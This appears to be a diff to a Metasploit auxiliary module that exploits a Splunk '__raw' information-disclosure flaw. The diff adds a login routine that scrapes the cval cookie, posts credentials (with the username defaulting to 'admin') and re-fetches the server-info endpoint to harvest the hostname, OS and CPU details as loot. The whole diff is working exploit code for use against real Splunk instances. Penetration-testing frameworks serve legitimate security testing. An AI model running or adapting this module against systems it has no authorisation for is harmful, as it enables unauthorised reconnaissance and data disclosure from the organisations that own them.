@@ -12,13 +12,15 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Splunk __raw Server Info Disclosure ',
         'Description' => %q{
-          Splunk through 6.2.3 7.0.1 allows information disclosure by appending
+          Splunk 6.2.3 through 7.0.1 allows information disclosure by appending
           /__raw/services/server/info/server-info?output_mode=json to a query.
+          Versisons 6.6.0 through 7.0.1 require authentication.
         },
         'License' => MSF_LICENSE,
         'Author' => [
           'n00bhaxor', # msf module
-          'KOF2002' # original PoC
+          'KOF2002', # original PoC
+          'h00die' # 6.6.0+
         ],
         'References' => [
           [ 'EDB', '44865' ],
@@ -36,30 +38,87 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8000),
-        OptString.new('USERNAME', [ false, 'User to login with', '']),
+        OptString.new('USERNAME', [ false, 'User to login with', 'admin']),
         OptString.new('PASSWORD', [ false, 'Password to login with', '']),
         OptString.new('TARGETURI', [ true, 'The URI of the Splunk Application', ''])
       ]
     )
   end
 
-  def run
-    res = send_request_cgi(
+  def authenticate
+    login_url = normalize_uri(target_uri.path, 'en-US', 'account', 'login')
+
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => login_url
+    })
+
+    unless res
+      fail_with(Failure::Unreachable, 'No response received for authentication request')
+    end
+
+    cval_value = res.get_cookies.match(/cval=([^;]*)/)[1]
+
+    unless cval_value
+      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the cval cookie for authentication')
+    end
+
+    auth_payload = {
+      'username' => datastore['USERNAME'],
+      'password' => datastore['PASSWORD'],
+      'cval' => cval_value,
+      'set_has_logged_in' => 'false'
+    }
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => login_url,
+      'cookie' => res.get_cookies,
+      'vars_post' => auth_payload
+    })
+
+    unless res && res.code == 200
+      fail_with(Failure::NoAccess, 'Failed to authenticate on the Splunk instance')
+    end
+
+    print_good('Successfully authenticated on the Splunk instance')
+    res.get_cookies
+  end
+
+  def get_contents(cookie = nil)
+    request = {
       'uri' => normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'services', 'server', 'info', 'server-info'),
       'vars_get' => {
         'output_mode' => 'json'
       }
-    )
+    }
+    request['cookie'] = cookie unless cookie.nil?
+    res = send_request_cgi(request)
 
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid response(response code: #{res.code})") unless res.code == 200
+    # 200 is <6.6.0 success, 303 is >=6.6.0 likely success but need auth first
+    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid response(response code: #{res.code})") unless res.code == 200 || res.code == 303
+    res
+  end
+
+  def run
+    # on 6.2.x-6.5.x this will work as its unauth
+    res = get_contents
+    # if we hit 6.6.0 - 7.1.0 we need to auth first
+    if res.body == '{"messages":[{"type":"ERROR","text":"See Other"}]}'
+      print_status('Authentication required, logging in and re-attempting')
+      res = get_contents(authenticate)
+    end
+
     begin
       j = JSON.parse(res.body)
     rescue JSON::ParserError
-      return fail_with(Failure::UnexpectedReply, 'Response not JSON parsable')
+      fail_with(Failure::UnexpectedReply, 'Response not JSON parsable')
     end
-    loot_path = store_loot('splunk.system.status', 'application/json', datastore['RHOST'], res.body, 'system_status')
+
+    loot_path = store_loot('splunk.system.status', 'application/json', datastore['RHOST'], res.body, 'system_status.json')
     print_good("Output saved to #{loot_path}")
+
     print_good("Hostname: #{j['entry'][0]['content']['host_fqdn']}")
     print_good("CPU Architecture: #{j['entry'][0]['content']['cpu_arch']}")
     print_good("Operating System: #{j['entry'][0]['content']['os_name']}")
